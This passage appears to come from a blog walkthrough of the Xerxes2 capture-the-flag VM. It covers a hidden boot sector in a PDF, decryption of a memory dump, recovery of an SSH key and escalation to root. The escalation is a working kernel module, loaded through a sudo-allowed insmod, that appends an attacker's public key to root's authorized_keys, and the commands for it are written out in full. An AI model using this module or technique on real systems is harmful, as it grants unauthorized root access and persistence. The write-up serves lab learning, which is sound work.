<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>00000000  83 E0 FF EB  1F 25 50 44   46 2D 31 2E  35 0A 39 39 .....%PDF-1.5.99
</span><span class='line'>00000010  39 20 30 20  6F 62 6A 0A   3C 3C 3E 3E  0A 73 74 72 9 0 obj.&lt;&lt;&gt;&gt;.str
</span><span class='line'>00000020  65 61 6D 0A  68 E0 08 17   BC 00 10 68  C0 07 1F EB eam.h......h....
</span><span class='line'>00000030  21 59 81 F9  4D 5A 74 0C   B4 0E 86 C1  CD 10 86 C5 !Y..MZt.........
</span><span class='line'>00000040  CD 10 EB ED  BE 55 00 AC   75 02 EB FE  B4 0E CD 10 .....U..u.......
</span><span class='line'>00000050  EB F5 EB 72  E9 2D 2D 57   41 52 4E 49  4E 47 2D 2D ...r.--WARNING--
</span><span class='line'>00000060  0A 20 20 20  55 6E 61 75   74 68 6F 72  69 7A 65 64 .   Unauthorized
</span><span class='line'>00000070  20 66 69 6C  65 20 61 63   63 65 73 73  20 77 69 6C file access wil
</span><span class='line'>00000080  6C 20 62 65  20 72 65 70   6F 72 74 65  64 2E 0A 20 l be reported..
</span><span class='line'>00000090  20 20 20 20  58 45 52 58   45 53 20 77  69 73 68 65 XERXES wishe
</span><span class='line'>000000A0  73 20 79 6F  75 0A 20 20   20 20 20 20  20 20 20 20 s you.
</span><span class='line'>000000B0  61 20 6D 6F  73 74 20 70   72 6F 64 75  63 74 69 76 a most productiv
</span><span class='line'>000000C0  65 20 64 61  79 00 68 6F   77 68 59 58  68 0D 0A 68 e day.howhYXh..h
</span><span class='line'>000000D0  37 69 68 68  7A 68 4F 77   68 34 35 68  0A 40 68 67 7ihhzhOwh45h.@hg
</span><span class='line'>000000E0  49 68 20 2C  68 23 6F 68   4D 5A 68 0A  0A 68 4E 6C Ih ,h#ohMZh..hNl
</span><span class='line'>000000F0  68 61 57 68  46 75 68 61   6D 68 0A 20  68 3A 20 68 haWhFuhamh. h: h
</span><span class='line'>00000100  69 73 68 64  20 68 6F 72   68 73 77 68  61 73 68 20 ishd horhswhash
</span><span class='line'>00000110  70 68 68 65  68 0A 54 E9   17 FF 00 00  00 00 00 00 phheh.T.........
</span><span class='line'>00000120  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
</span><span class='line'>00000130  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
</span><span class='line'>00000140  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
</span><span class='line'>00000150  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
</span><span class='line'>00000160  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
</span><span class='line'>00000170  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
</span><span class='line'>00000180  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
</span><span class='line'>00000190  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
</span><span class='line'>000001A0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
</span><span class='line'>000001B0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
</span><span class='line'>000001C0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
</span><span class='line'>000001D0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
</span><span class='line'>000001E0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 00 00 ................
</span><span class='line'>000001F0  00 00 00 00  00 00 00 00   00 00 00 00  00 00 55 AA ..............U.
</span><span class='line'>00000200  25 50 44 46  2D 31 2E 35   0A 25 D0 D4  C5 D8 0A 34 %PDF-1.5.%.....4
</span></code></pre></td></tr></table></div></figure>


<p>Notice the 2 <code>%PDF-1.5</code>. Assuming this really was a MBR, I decided to strip the first 512 bytes and put that in a new file. Then, the remainder of the bytes to a second file, and test by attempting to open both in a PDF viewer again.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# head -c 512 polito.pdf &gt; first
</span><span class='line'>root@kali:~# file -k first
</span><span class='line'>first: x86 boot sector, code offset 0xe0 DBase 3 data file with memo<span class="o">(</span>s<span class="o">)</span> <span class="o">(</span>1146103071 records<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>root@kali:~# tail -c +512 polito.pdf &gt; second
</span><span class='line'>root@kali:~# file second
</span><span class='line'>second: Dyalog APL
</span><span class='line'>root@kali:~#
</span></code></pre></td></tr></table></div></figure>


<p>Opening <code>first</code> in a PDF viewer gave a blank PDF, and <code>second</code> gave the PDF we saw originally with <code>polito.pdf</code>. <code>first</code> was still seen as as x86 boot sector file. I searched furiously for way to analyze bootsector code, learned about the <a href="http://en.wikipedia.org/wiki/Master_boot_record#Sector_layout">structure</a> etc. Eventually it was time to take a break and come back with a fresh look at this.</p>

<p>I came back with some new ideas. One of them being that I should quickly create a VM, attach <code>first</code> as a disk and try run it and see what the output would be. VirtualBox did not like the file format of <code>first</code> :( Next I resorted to using <code>qemu</code>. And success!</p>

<p><img src="https://i.imgur.com/1HFOfwc.png"></p>

<p>Running <code>$ qemu first</code>, booted a vm and ran the bootsector code, revealing a password of <em>amFuaWNl</em>. The next part was pretty easy. I assumed this was the password word for the potentially GPG encrypted <code>dump</code> file:</p>

<figure class='code'><figcaption><span>GPG decrypt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>gpg -d dump.gpg &gt; decrypted_dump
</span><span class='line'>gpg: CAST5 encrypted data
</span><span class='line'>gpg: encrypted with 1 passphrase
</span><span class='line'>gpg: WARNING: message was not integrity protected
</span><span class='line'>
</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>file decrypted_dump
</span><span class='line'>decrypted_dump: data
</span><span class='line'>
</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>ls -lh decrypted_dump
</span><span class='line'>-rw-r--r-- 1 polito polito 126M Aug 10 02:12 decrypted_dump
</span></code></pre></td></tr></table></div></figure>


<p>So we successfully decrypted <code>dump.gpg</code> it seems resulting in a 126M file, however at first glance it appears to just be junk. I paged and paged and paged and paged and paged through <code>less</code> until I saw cleartext that looked like kernel boot messages. The first thought that came to mind after seeing this was &ldquo;Could this be some sort of memory dump?&rdquo;.</p>

<p>As the kernel messages were interesting, I decided to put the decrypted dump through strings. Eventually after going through even more pages, it seemed like there were even some command history in the dump. Ok, well then I believe its time to look for things that could relate to that file in <code>/opt/backup</code>:</p>

<figure class='code'><figcaption><span>Finding korenchkin.tar.enc password</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>grep <span class="k">$(</span>ls /opt/backup/<span class="k">)</span> decrypted_strings
</span><span class='line'>korenchkin.tar.enc
</span><span class='line'>openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
</span><span class='line'>openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
</span><span class='line'>openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
</span><span class='line'>polito@xerxes2:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Heh, ok. Easy enough. <code>korenchkin.tar.enc</code> was encrypted using <code>openssl</code>. We can simply decrypt this with the <code>-d</code> flag. From the dump we were able to get the password used too:</p>

<figure class='code'><figcaption><span>decrypting korenchkin.tar.enc</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>polito@xerxes2:~<span class="nv">$ </span>openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out ~/korenchkin.tar
</span><span class='line'>
</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>file korenchkin.tar
</span><span class='line'>korenchkin.tar: POSIX tar archive <span class="o">(</span>GNU<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>polito@xerxes2:~<span class="nv">$ </span>tar xvf korenchkin.tar
</span><span class='line'>.ssh/id_rsa
</span><span class='line'>.ssh/id_rsa.pub
</span><span class='line'>polito@xerxes2:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Extracting <code>korenchkin.tar</code> revealed a SSH key pair, so to become korenchkin I copied the SSH key to my Kali VM and SSH in as <code>korenchkin</code>:</p>

<figure class='code'><figcaption><span>SSH as korenchkin</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh -i korenchkin.key korenchkin@192.168.56.102
</span><span class='line'>
</span><span class='line'>Welcome to xerxes2.
</span><span class='line'>      XERXES wishes you
</span><span class='line'>       a pleasant stay.
</span><span class='line'>____   ___  ____  ___  __ ____   ___  ____     ____     ____
</span><span class='line'><span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span class="se">\ </span> 6MMMMb
</span><span class='line'> <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM69 &quot;  `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM<span class="s1">&#39;    ` MM&#39;</span>  <span class="sb">`</span>Mb
</span><span class='line'>  <span class="sb">`</span>MM,P   MM    MM MM<span class="s1">&#39;      `MM,P   MM    MM YM.           ,MM </span>
</span><span class='line'><span class="s1">   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
</span><span class='line'>   d<span class="sb">`</span>MM.  MM       MM        d<span class="sb">`</span>MM.  MM            <span class="sb">`</span>Mb   ,M<span class="s1">&#39;    </span>
</span><span class='line'><span class="s1">  d&#39;</span> <span class="sb">`</span>MM. YM    d9 MM       d<span class="s1">&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
</span><span class='line'>
</span><span class='line'>You have new mail.
</span><span class='line'>korenchkin@xerxes2:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p><em>You have new mail.</em></p>

<h2>becoming root</h2>

<p>Again, enumeration is key. As <code>korenchkin</code>, you will see that you may run.</p>

<figure class='code'><figcaption><span>korenchkin sudo</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for </span>korenchkin on this host:
</span><span class='line'>    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User korenchkin may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /sbin/insmod, <span class="o">(</span>root<span class="o">)</span> /sbin/rmmod
</span></code></pre></td></tr></table></div></figure>


<p>So we may run insmod as <code>root</code>. Immediately this hints towards the fact that we will need to write a custom kernel module and maybe spawn a shell? And so, we board another educational school bus ride towards kernel module land.</p>

<p>I confirmed that the kernel-headers were installed for the current kernel. Googling around got me to a sample &ldquo;Hello World!&rdquo; kernel module. This together with a sample <code>Makefile</code> was working fine. The sources for the files initially tested were:</p>

<figure class='code'><figcaption><span>hello.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;linux/module.h&gt;       </span><span class="cm">/* Needed by all modules */</span><span class="cp"></span>
</span><span class='line'><span class="cp">#include &lt;linux/kernel.h&gt;       </span><span class="cm">/* Needed for KERN_INFO */</span><span class="cp"></span>
</span><span class='line'><span class="cp">#include &lt;linux/init.h&gt;         </span><span class="cm">/* Needed for the macros */</span><span class="cp"></span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">hello_start</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&quot;Loading hello module...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">hello_end</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&quot;Goodbye Mr.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">module_init</span><span class="p">(</span><span class="n">hello_start</span><span class="p">);</span>
</span><span class='line'><span class="n">module_exit</span><span class="p">(</span><span class="n">hello_end</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>hello Makefile</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='make'><span class='line'><span class="nv">obj-m</span> <span class="o">+=</span> hello.o
</span><span class='line'>
</span><span class='line'><span class="nf">all</span><span class="o">:</span>
</span><span class='line'>    make -C /lib/modules/<span class="k">$(</span>shell uname -r<span class="k">)</span>/build <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> modules
</span><span class='line'>
</span><span class='line'><span class="nf">clean</span><span class="o">:</span>
</span><span class='line'>    make -C /lib/modules/<span class="k">$(</span>shell uname -r<span class="k">)</span>/build <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> clean
</span></code></pre></td></tr></table></div></figure>


<p>I took <code>hello.c</code> and the <code>Makefile</code>, put them into a directory, built the module with <code>make</code>, and loaded it. Once the module loaded I checked the kernel messages via <code>dmesg</code> to confirm it working:</p>

<figure class='code'><figcaption><span>hello kernel module testing</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>make
</span><span class='line'>make -C /lib/modules/3.2.0-4-686-pae/build <span class="nv">M</span><span class="o">=</span>/home/korenchkin/kern modules
</span><span class='line'>make<span class="o">[</span>1<span class="o">]</span>: Entering directory <span class="sb">`</span>/usr/src/linux-headers-3.2.0-4-686-pae<span class="s1">&#39;</span>
</span><span class='line'><span class="s1">  CC [M]  /home/korenchkin/kern/hello.o</span>
</span><span class='line'><span class="s1">  Building modules, stage 2.</span>
</span><span class='line'><span class="s1">  MODPOST 1 modules</span>
</span><span class='line'><span class="s1">  CC      /home/korenchkin/kern/hello.mod.o</span>
</span><span class='line'><span class="s1">  LD [M]  /home/korenchkin/kern/hello.ko</span>
</span><span class='line'><span class="s1">make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;</span>
</span><span class='line'>
</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>sudo insmod hello.ko
</span><span class='line'>
</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>dmesg <span class="p">|</span> tail
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'><span class="o">[</span>68192.983366<span class="o">]</span> hello: module license <span class="s1">&#39;unspecified&#39;</span> taints kernel.
</span><span class='line'><span class="o">[</span>68192.983369<span class="o">]</span> Disabling lock debugging due to kernel taint
</span><span class='line'><span class="o">[</span>68192.983637<span class="o">]</span> Loading hello module...
</span><span class='line'>korenchkin@xerxes2:~/kern<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Alrighty, that was, easy! However, this is not really useful. I want command execution! So, what did I do? <code>#include &lt;stdio.h&gt;</code>, and <code>system()</code> some commands to run <code>stuff</code>, getting me a <code>/tmp/getroot</code> prepared.</p>

<p><em>insert loud crash and burn sound here</em></p>

<p>Turns out, kernel development is pretty anti command execution. Compiling modules that have stuff like <code>stdio.h</code> included will fail with headers not found type errors. One can hack the Makefile to include headers from <code>/usr/include</code>, but it just ends up being a mess. However, there is a handy little function in <code>kmod.h</code> called <code>call_usermodehelper()</code>. From the <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html">kernel docs</a>, <code>call_usermodehelper()</code> will <em>prepare and start a usermode application</em>. <strong>That</strong> sounds pretty handy in our case :)</p>

<p>So, time to rewrite <code>hello.c</code> to be useful! Puzzling the pieces together I found on the internet, <a href="http://stackoverflow.com/questions/7143105/call-usermodehelper-call-usermodehelperpipe-usage">this</a> amongst other pieces of information helped get the ball rolling.</p>

<figure class='code'><figcaption><span>Rewritten hello.c to rooted.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#include &lt;linux/module.h&gt;       /* Needed by all modules */</span>
</span><span class='line'><span class="c">#include &lt;linux/kernel.h&gt;       /* Needed for KERN_INFO */</span>
</span><span class='line'><span class="c">#include &lt;linux/init.h&gt;         /* Needed for the macros */</span>
</span><span class='line'>
</span><span class='line'>/* For our shell ^_^ */
</span><span class='line'><span class="c">#include&lt;linux/kmod.h&gt;</span>
</span><span class='line'>
</span><span class='line'>int get_root <span class="o">(</span>void<span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>
</span><span class='line'>    char * envp<span class="o">[]</span> <span class="o">=</span> <span class="o">{</span> <span class="s2">&quot;HOME=/&quot;</span>, NULL <span class="o">}</span><span class="p">;</span>
</span><span class='line'>    char *argv<span class="o">[]</span> <span class="o">=</span> <span class="o">{</span> <span class="s2">&quot;/bin/bash&quot;</span>, <span class="s2">&quot;-c&quot;</span>, <span class="s2">&quot;/bin/cat /tmp/pubkey &gt;&gt; /root/.ssh/authorized_keys&quot;</span>, NULL<span class="o">}</span><span class="p">;</span>
</span><span class='line'>    printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;Call Usermodehelper...\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    call_usermodehelper<span class="o">(</span>argv<span class="o">[</span>0<span class="o">]</span>, argv, envp, UMH_WAIT_EXEC<span class="o">)</span><span class="p">;</span>
</span><span class='line'>    printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;Done usermodehelper...\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>static int __init hello_start<span class="o">(</span>void<span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>    printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;Loading rooted module...\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return </span>get_root<span class="o">()</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>static void __exit hello_end<span class="o">(</span>void<span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>    printk<span class="o">(</span>KERN_INFO <span class="s2">&quot;Goodbye Mr.\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>module_init<span class="o">(</span>hello_start<span class="o">)</span><span class="p">;</span>
</span><span class='line'>module_exit<span class="o">(</span>hello_end<span class="o">)</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>As can be seen in the code above, I added a function <code>get_root()</code>, that will append whatever is in <code>/tmp/pubkey</code> to <code>/root/.ssh/authorized_keys</code> using <code>call_usermodehelper</code>. <code>/tmp/pubkey</code> contained the public key of the keypair I generated at the beginning of starting Xerxes2. I modified <code>Makefile</code> to have <code>obj-m += rooted.o</code> this time, <code>make</code>&rsquo;d the source and ran the <code>insmod</code> for the newly build <code>rooted.ko</code>. Then, I inspected the kernel messages again, and attempted to login as root:</p>

<figure class='code'><figcaption><span>Xerxes2 rooting</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>vi rooted.c
</span><span class='line'>
</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>vi Makefile
</span><span class='line'>
</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>make
</span><span class='line'>make -C /lib/modules/3.2.0-4-686-pae/build <span class="nv">M</span><span class="o">=</span>/home/korenchkin/kern modules
</span><span class='line'>make<span class="o">[</span>1<span class="o">]</span>: Entering directory <span class="sb">`</span>/usr/src/linux-headers-3.2.0-4-686-pae<span class="s1">&#39;</span>
</span><span class='line'><span class="s1">  CC [M]  /home/korenchkin/kern/rooted.o</span>
</span><span class='line'><span class="s1">  Building modules, stage 2.</span>
</span><span class='line'><span class="s1">  MODPOST 1 modules</span>
</span><span class='line'><span class="s1">  CC      /home/korenchkin/kern/rooted.mod.o</span>
</span><span class='line'><span class="s1">  LD [M]  /home/korenchkin/kern/rooted.ko</span>
</span><span class='line'><span class="s1">make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;</span>
</span><span class='line'>
</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6sCFrz036WAchGk66yROuY+hePiULr49D1E97wuK0mK4Uw0J+4u1ngDVw+h8xwtpxPZkOWcn7s86OkXcEkWzGoduC1Y+YMP0XnQFG4hdeX4yNypaAsLKZss6tTHe5kHzbTdiOUthSmiJHwyl39TXibSBILTnMOLaxzLM17xUCfJviRm2mOAq6uELYPPf8thzqVeBoIsdXfjh8QeLMRHloyjGe1ZeY0m4pqwg9d2azaBAirjBMv0cyk+1w51SNR61EQ6SRtc6BE7ayc6C+MZW4TkP/lwOQLH7CXrEoyL3bDskD6c9563jRSLtiVfzjfkjoyUDiTCWv/ThirZMqSot/&quot;</span> &gt; /tmp/pubkey
</span><span class='line'>
</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>sudo insmod rooted.ko
</span><span class='line'>
</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span>dmesg <span class="p">|</span> tail
</span><span class='line'><span class="o">[</span>   14.512040<span class="o">]</span> eth0: no IPv6 routers present
</span><span class='line'><span class="o">[</span>  290.023022<span class="o">]</span> Clocksource tsc unstable <span class="o">(</span><span class="nv">delta</span> <span class="o">=</span> 4686567555 ns<span class="o">)</span>
</span><span class='line'><span class="o">[</span>  290.025022<span class="o">]</span> Switching to clocksource acpi_pm
